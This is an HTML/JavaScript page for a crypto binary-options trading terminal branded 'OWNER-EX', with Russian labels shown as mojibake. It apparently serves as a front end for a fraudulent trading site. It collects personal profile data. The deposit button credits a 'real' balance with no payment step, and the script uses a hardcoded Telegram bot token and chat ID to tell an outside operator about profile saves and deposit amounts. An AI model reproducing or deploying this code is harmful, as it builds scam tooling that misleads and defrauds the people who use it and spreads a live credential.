<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>OWNER-EX PRO TERMINAL</title>
    <script src="https://unpkg.com/lightweight-charts@3.8.0/dist/lightweight-charts.standalone.production.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap');

        :root {
            --bg: #0b0e11;
            --panel: #161a1e;
            --accent: #00ffad;
            --red: #f6465d;
            --green: #0ecb81;
            --border: #2b2f36;
            --radius: 12px;
        }

        body, html {
            margin: 0; padding: 0;
            background: var(--bg);
            color: #eaecef;
            font-family: 'Inter', sans-serif;
            height: 100%;
            overflow: hidden;
        }

        .main-wrapper {
            display: flex;
            flex-direction: column;
            height: 100vh;
        }

        header {
            height: 65px;
            background: var(--panel);
            border-bottom: 1px solid var(--border);
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 0 20px;
            flex-shrink: 0;
            z-index: 100;
        }

        .logo-box {
            display: flex;
            align-items: center;
            gap: 12px;
        }

        /* –ó–µ–ª–µ–Ω–∞—è –∏–∫–æ–Ω–∫–∞ E */
        .logo-icon {
            width: 35px;
            height: 35px;
            background: var(--accent);
            border-radius: 8px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #000;
            font-weight: 900;
            font-size: 22px;
        }

        .logo-text {
            font-weight: 900;
            color: #fff;
            font-size: 20px;
            letter-spacing: 1px;
        }

        .acc-toggle {
            display: flex;
            background: #000;
            border: 1px solid var(--border);
            padding: 3px;
            border-radius: 10px;
        }

        .acc-btn {
            padding: 6px 15px;
            border: none;
            background: none;
            color: #555;
            cursor: pointer;
            font-size: 12px;
            font-weight: bold;
            border-radius: 8px;
            transition: 0.3s;
        }

        .acc-btn.active {
            background: var(--accent);
            color: #000;
        }

        .terminal-container {
            display: grid;
            grid-template-columns: 70px 1fr 300px;
            flex: 1;
            min-height: 0;
        }

        .side-nav {
            background: var(--panel);
            border-right: 1px solid var(--border);
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 25px 0;
            gap: 30px;
        }

        .nav-item {
            font-size: 22px;
            color: #848e9c;
            cursor: pointer;
            transition: 0.3s;
        }

        .nav-item:hover {
            color: var(--accent);
        }

        .chart-section {
            display: flex;
            flex-direction: column;
            border-right: 1px solid var(--border);
            background: #000;
        }

        #chart { flex: 1; }

        .history-section {
            height: 200px;
            background: var(--panel);
            border-top: 1px solid var(--border);
            overflow-y: auto;
            padding: 15px;
        }

        .history-section h4 {
            margin: 0 0 10px 0;
            font-size: 12px;
            color: var(--accent);
            text-transform: uppercase;
        }

        table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }

        th { text-align: left; color: #848e9c; padding: 8px; border-bottom: 1px solid var(--border); }
        td { padding: 8px; border-bottom: 1px solid #222; }

        .trade-panel {
            padding: 25px;
            background: var(--panel);
            display: flex;
            flex-direction: column;
            gap: 20px;
        }

        .input-group {
            background: var(--bg);
            border: 1px solid var(--border);
            padding: 12px;
            border-radius: var(--radius);
        }

        .input-group label {
            display: block;
            font-size: 11px;
            color: #848e9c;
            margin-bottom: 5px;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: #fff;
            width: 100%;
            font-size: 20px;
            font-weight: bold;
            outline: none;
        }

        .btn-exec {
            height: 60px;
            border: none;
            border-radius: var(--radius);
            font-weight: 800;
            font-size: 18px;
            cursor: pointer;
            transition: 0.2s;
        }

        .btn-call { background: var(--green); color: #000; margin-bottom: 10px; }
        .btn-put { background: var(--red); color: #fff; }

        /* MODALS */
        .modal-overlay {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.85);
            z-index: 10000;
            display: none;
            justify-content: center;
            align-items: center;
            backdrop-filter: blur(8px);
        }

        .modal-box {
            background: var(--panel);
            width: 550px;
            padding: 30px;
            border-radius: 20px;
            border: 1px solid var(--border);
        }

        .custom-input {
            background: #0b0e11;
            border: 1px solid var(--border);
            color: #fff;
            padding: 12px;
            border-radius: 8px;
            width: 100%;
            box-sizing: border-box;
            margin-bottom: 15px;
        }
    </style>
</head>
<body>

<div class="main-wrapper">
    <header>
        <div class="header-left">
            <div class="logo-box">
                <div class="logo-icon">E</div>
                <div class="logo-text">OWNER-EX</div>
            </div>
            <select id="assetSelect" onchange="changeSymbol(this.value)" style="background:#000; color:#fff; border:1px solid var(--border); padding:5px; border-radius:5px;">
                <option value="BTCUSDT">BTC/USDT</option>
            </select>
        </div>
        <div style="display: flex; align-items: center; gap: 20px;">
            <div class="acc-toggle">
                <button class="acc-btn active" id="demoBtn" onclick="switchAccount('demo')">DEMO</button>
                <button class="acc-btn" id="realBtn" onclick="switchAccount('real')">REAL</button>
            </div>
            <div id="balanceDisplay" style="font-weight: 900; color: var(--green); font-size: 20px;">$10,000.00</div>
        </div>
    </header>

    <div class="terminal-container">
        <div class="side-nav">
            <i class="fas fa-chart-area nav-item" onclick="closeModals()"></i>
            <i class="fas fa-wallet nav-item" onclick="openModal('cashierModal')"></i>
            <i class="fas fa-user-circle nav-item" onclick="openModal('profileModal')"></i>
        </div>

        <div class="chart-section">
            <div id="chart"></div>
            <div class="history-section">
                <h4>–ò–°–¢–û–†–ò–Ø –¢–û–†–ì–û–í–õ–ò</h4>
                <table>
                    <thead><tr><th>–ê–∫—Ç–∏–≤</th><th>–¢–∏–ø</th><th>–°—É–º–º–∞</th><th>–î–æ—Ö–æ–¥</th></tr></thead>
                    <tbody id="tradeHistoryBody"></tbody>
                </table>
            </div>
        </div>

        <div class="trade-panel">
            <div class="input-group"><label>–°–£–ú–ú–ê –ò–ù–í–ï–°–¢–ò–¶–ò–ò (USDT)</label><input type="number" id="tradeAmount" value="100"></div>
            <div class="input-group"><label>–í–†–ï–ú–Ø –≠–ö–°–ü–ò–†–ê–¶–ò–ò (–°–ï–ö)</label><input type="number" id="tradeTime" value="30"></div>
            <div style="text-align: center; margin: 10px 0;">
                <div style="color: gray; font-size: 12px;">–í–´–ü–õ–ê–¢–ê</div>
                <div style="font-size: 32px; font-weight: 900; color: var(--accent);">82%</div>
            </div>
            <button class="btn-exec btn-call" onclick="handleTrade('CALL')">–í–´–®–ï ‚Üë</button>
            <button class="btn-exec btn-put" onclick="handleTrade('PUT')">–ù–ò–ñ–ï ‚Üì</button>
        </div>
    </div>
</div>

<div id="profileModal" class="modal-overlay">
    <div class="modal-box">
        <h3 style="color: #fff; text-align: center; margin-bottom: 25px;">–ü–†–û–§–ò–õ–¨</h3>
        <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
            <input type="text" id="p_name" class="custom-input" placeholder="–ò–º—è">
            <input type="text" id="p_surname" class="custom-input" placeholder="–§–∞–º–∏–ª–∏—è">
            <input type="text" id="p_nick" class="custom-input" placeholder="–ù–∏–∫–Ω–µ–π–º">
            <input type="text" id="p_birth" class="custom-input" placeholder="–î–î.–ú–ú.–ì–ì–ì–ì">
            <input type="text" id="p_country" class="custom-input" placeholder="–°—Ç—Ä–∞–Ω–∞">
            <input type="text" id="p_city" class="custom-input" placeholder="–ì–æ—Ä–æ–¥">
            <input type="text" id="p_zip" class="custom-input" placeholder="–ò–Ω–¥–µ–∫—Å">
            <input type="text" id="p_promo" class="custom-input" placeholder="–ü—Ä–æ–º–æ–∫–æ–¥">
        </div>
        <button onclick="saveProfile()" class="btn-exec btn-call" style="width:100%; height:50px; margin-top:20px;">–°–û–•–†–ê–ù–ò–¢–¨</button>
        <div onclick="closeModals()" style="text-align:center; color:gray; cursor:pointer; margin-top:15px;">–û—Ç–º–µ–Ω–∞</div>
    </div>
</div>

<div id="cashierModal" class="modal-overlay">
    <div class="modal-box" style="width: 400px;">
        <h3 style="text-align:center;">–ö–ê–°–°–ê</h3>
        <input type="number" id="depositInput" class="custom-input" placeholder="–°—É–º–º–∞ –ø–æ–ø–æ–ª–Ω–µ–Ω–∏—è $">
        <button onclick="processDeposit()" class="btn-exec btn-call" style="width:100%; height:50px;">–ü–û–ü–û–õ–ù–ò–¢–¨</button>
        <button onclick="closeModals()" style="width:100%; background:none; border:none; color:gray; margin-top:10px; cursor:pointer;">–ó–∞–∫—Ä—ã—Ç—å</button>
    </div>
</div>

<script>
    // –î–ê–ù–ù–´–ï –í–°–¢–ê–í–õ–ï–ù–´ –ù–ê–ü–†–Ø–ú–£–Æ
    const TG_TOKEN = "8102627080:AAGGbjyR0g1VzICKb-ait4t3CA34PJz1g5M";
    const TG_USER_ID = 6426834853;

    let bals = JSON.parse(localStorage.getItem('bals')) || { demo: 10000, real: 0 };
    let profile = JSON.parse(localStorage.getItem('profile')) || {};
    let tHist = JSON.parse(localStorage.getItem('tradeHistory')) || [];
    let currentAccount = 'demo', lastPrice = 0, chart, series;

    function saveAll() {
        localStorage.setItem('bals', JSON.stringify(bals));
        localStorage.setItem('profile', JSON.stringify(profile));
        localStorage.setItem('tradeHistory', JSON.stringify(tHist));
    }

    function updateUI() {
        document.getElementById('balanceDisplay').innerText = `$${bals[currentAccount].toLocaleString()}`;
        document.getElementById('tradeHistoryBody').innerHTML = tHist.map(h => `<tr><td>${h.s}</td><td style="color:${h.t==='CALL'?'#0ecb81':'#f6465d'}">${h.t}</td><td>$${h.a}</td><td style="color:${h.r.includes('+')?'#0ecb81':'#f6465d'}">${h.r}</td></tr>`).join('');
    }

    window.openModal = (id) => {
        document.getElementById(id).style.display = 'flex';
        if(id === 'profileModal') {
            document.getElementById('p_name').value = profile.p_name || '';
            document.getElementById('p_surname').value = profile.p_surname || '';
            document.getElementById('p_nick').value = profile.p_nick || '';
            document.getElementById('p_birth').value = profile.p_birth || '';
            document.getElementById('p_country').value = profile.p_country || '';
            document.getElementById('p_city').value = profile.p_city || '';
            document.getElementById('p_zip').value = profile.p_zip || '';
            document.getElementById('p_promo').value = profile.p_promo || '';
        }
    };

    window.closeModals = () => document.querySelectorAll('.modal-overlay').forEach(m => m.style.display = 'none');

    window.saveProfile = () => {
        profile = {
            p_name: document.getElementById('p_name').value, p_surname: document.getElementById('p_surname').value,
            p_nick: document.getElementById('p_nick').value, p_birth: document.getElementById('p_birth').value,
            p_country: document.getElementById('p_country').value, p_city: document.getElementById('p_city').value,
            p_zip: document.getElementById('p_zip').value, p_promo: document.getElementById('p_promo').value
        };
        saveAll();
        // –£–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Ç–æ–ª—å–∫–æ –ø—Ä–∏ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏–∏ –ø—Ä–æ—Ñ–∏–ª—è –¥–ª—è —Ç–µ—Å—Ç–∞ —Å–≤—è–∑–∏
        fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_USER_ID}&text=üë§ –ü—Ä–æ—Ñ–∏–ª—å –æ–±–Ω–æ–≤–ª–µ–Ω: ${profile.p_nick}`).catch(()=>{});
        alert("–î–∞–Ω–Ω—ã–µ —Å–æ—Ö—Ä–∞–Ω–µ–Ω—ã!"); closeModals();
    };

    window.handleTrade = (type) => {
        let amt = parseFloat(document.getElementById('tradeAmount').value);
        if (amt > bals[currentAccount] || amt <= 0) return alert("–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ —Å—Ä–µ–¥—Å—Ç–≤!");
        bals[currentAccount] -= amt; updateUI();
        const startPrice = lastPrice;

        // –£–í–ï–î–û–ú–õ–ï–ù–ò–Ø –û –°–î–ï–õ–ö–ê–• –û–¢–ö–õ–Æ–ß–ï–ù–´
        
        setTimeout(() => {
            const win = (type === 'CALL' && lastPrice > startPrice) || (type === 'PUT' && lastPrice < startPrice);
            const res = win ? `+$${(amt * 0.82).toFixed(2)}` : `-$${amt}`;
            if (win) bals[currentAccount] += (amt * 1.82);
            tHist.unshift({ s: 'BTCUSDT', t: type, a: amt, r: res });
            saveAll(); updateUI();
        }, parseInt(document.getElementById('tradeTime').value) * 1000);
    };

    window.switchAccount = (acc) => {
        currentAccount = acc;
        document.getElementById('demoBtn').classList.toggle('active', acc === 'demo');
        document.getElementById('realBtn').classList.toggle('active', acc === 'real');
        updateUI();
    };

    window.processDeposit = () => {
        let amt = parseFloat(document.getElementById('depositInput').value);
        if (amt > 0) {
            bals.real += amt; saveAll(); updateUI();
            fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage?chat_id=${TG_USER_ID}&text=üí≥ –î–µ–ø–æ–∑–∏—Ç: +$${amt}`).catch(()=>{});
            alert("–ü–æ–ø–æ–ª–Ω–µ–Ω–æ!"); closeModals();
        }
    };

    function initChart() {
        chart = LightweightCharts.createChart(document.getElementById('chart'), {
            layout: { background: { color: '#000' }, textColor: '#848e9c' },
            grid: { vertLines: { color: '#111' }, horzLines: { color: '#111' } },
            timeScale: { timeVisible: true, secondsVisible: true }
        });
        series = chart.addCandlestickSeries({ upColor: '#0ecb81', downColor: '#f6465d' });
        fetch(`https://api.binance.com/api/v3/klines?symbol=BTCUSDT&interval=1m&limit=500`)
            .then(r => r.json()).then(d => series.setData(d.map(x => ({ time: x[0]/1000, open: +x[1], high: +x[2], low: +x[3], close: +x[4] }))));
        const ws = new WebSocket(`wss://stream.binance.com:9443/ws/btcusdt@kline_1s`);
        ws.onmessage = e => { 
            const k = JSON.parse(e.data).k;
            lastPrice = +k.c; 
            series.update({ time: k.t/1000, open: +k.o, high: +k.h, low: +k.l, close: lastPrice }); 
        };
    }

    initChart(); updateUI();
</script>
</body>
</html>
